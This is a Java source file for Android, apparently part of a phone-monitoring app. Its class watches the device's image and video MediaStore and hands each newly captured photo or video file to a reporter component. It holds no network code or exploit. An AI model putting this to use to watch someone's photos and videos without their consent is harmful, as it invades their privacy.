package org.ddth.android.monitor.observer;

import java.io.File;

import org.ddth.android.monitor.core.AndroidDC;
import org.ddth.http.core.Logger;
import org.ddth.mobile.monitor.core.DC;
import org.ddth.mobile.monitor.core.Reporter;
import org.ddth.mobile.monitor.report.Media;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.MediaStore.MediaColumns;

public class AndroidCameraWatcher extends AndroidWatcher {
	private static final String[] INTENTS = { };
	
	public AndroidCameraWatcher(Reporter reporter) {
		setReporter(reporter);
	}
	
	@Override
	public String[] getIntents() {
		return INTENTS;
	}
	
	@Override
	public void start(DC dc) {
		super.start(dc);
		registerContentObserver((AndroidDC)dc);
	}

	/**
	 * This will register 2 media store observers, one for image and the other
	 * for video capturing.
	 * 
	 * @param dc
	 */
	private void registerContentObserver(final AndroidDC dc) {
		registerContentObserver(dc, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
		registerContentObserver(dc, MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
	}
	
	/**
	 * Register an observer on the given {@link Uri}.
	 * 
	 * @param dc
	 * @param uri
	 */
	private void registerContentObserver(final AndroidDC dc, final Uri uri) {
		final Context context = dc.getContext();
		ContentObserver observer = new ContentObserver(null) {
			public void onChange(boolean selfChange) {
				Media media = readFromMediaStore(context, uri);
				if (media != null) {
					getReporter().report(dc, media);
				}
			}
		};
		context.getContentResolver().registerContentObserver(uri, false, observer);
	}

	private Media readFromMediaStore(Context context, Uri uri) {
		Cursor cursor = context.getContentResolver().query(
				uri, null, null, null, "date_added DESC");
		Media media = null;
		if (cursor.moveToNext()) {
			int dataColumn = cursor.getColumnIndexOrThrow(MediaColumns.DATA);
			String filePath = cursor.getString(dataColumn);
			int mimeTypeColumn = cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE);
			String mimeType = cursor.getString(mimeTypeColumn);
			media = new Media(new File(filePath), mimeType);
			Logger.getDefault().debug(media.file.getAbsolutePath());
		}
		cursor.close();
		return media;
	}
}
